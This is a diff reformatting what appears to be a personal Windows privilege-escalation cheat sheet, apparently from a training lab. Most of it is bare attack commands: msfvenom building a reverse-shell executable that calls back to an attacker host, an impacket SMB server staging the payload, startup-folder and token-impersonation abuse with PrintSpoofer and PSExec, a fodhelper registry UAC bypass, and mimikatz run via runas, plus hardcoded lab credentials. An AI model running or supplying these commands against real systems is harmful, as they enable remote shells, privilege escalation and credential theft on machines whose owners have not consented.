@@ -341,19 +341,8 @@ tasklist /V | findstr mspaint.exe
 file://C:/windows/system32/cmd.exe
 ```
 
-
-
-xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
-copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
-rdesktop -u user -p password321 10.10.88.2
-tasklist /V | findstr mspaint.exe
-file://C:/windows/system32/cmd.exe
-________________________________________________
-CATEGORY : STARTUP APPS
-________________________________________________
-
+## CATEGORY "STARTUP APPS"
+```
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
@@ -361,62 +350,40 @@ copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
 C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 cscript C:\PrivEsc\CreateShortcut.vbs
 rdesktop -u admin 10.10.88.2
+```
 
+## CATEGORY "TOKEN IMPERSONATION" - ROTTEN POTATO
 
+## CATEGORY "TOKEN IMPERSONATION" - ROUGE POTATO
 
-________________________________________________
-CATEGORY TOKEN IMPERSONATION: - ROUGE POTATO 
-________________________________________________
-
-
-
-________________________________________________
-CATEGORY OKEN IMPERSONATION: PRINTSPOOLER
-________________________________________________
-
-
+## CATEGORY "TOKEN IMPERSONATION" - PRINTSPOOLER
+```
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
 PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+```
 
-
-
-________________________________________________
-PRIVILEGE ESCALATION SCRIPTS
-________________________________________________
-
-
-
-________________________________________________
-UAC BYPASS
-________________________________________________
-
+## UAC BYPASS
+```
 whoami /groups
 powershell.exe Start-Process cmd.exe -Verb runAs
 Sighcheck.exe -a -m C:\Windows\System32\fodhelper.exe
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d “cmd.exe” /f
+```
 
-
+## OTHERS - ARRANGE
+```
 runas /user:USER­NAME “C:\full\path\of\Program.exe”
 
 runas /user:Adminsitrator “C:\Windows\system32\notepad.exe”
 runas /user:Adminsitrator “C:\Windows\system32\cmd.exe”
 runas /user:rgeller “C:\temp\mimikatz.exe”
-
-
-
-
 runas /user:rgeller /WAIT /B "c:/windows/system32/cmd.exe"
-
-
-
-
-
 
 zenmap
 Kali Linux
@@ -482,7 +449,7 @@ Issuer: USERTrust RSA Certification Authority
 Server Certificate
 Subject: Sectigo RSA Domain Validation Secure Server CA
 Issuer: *.datalines.com.sg
-
+```
 
 
 
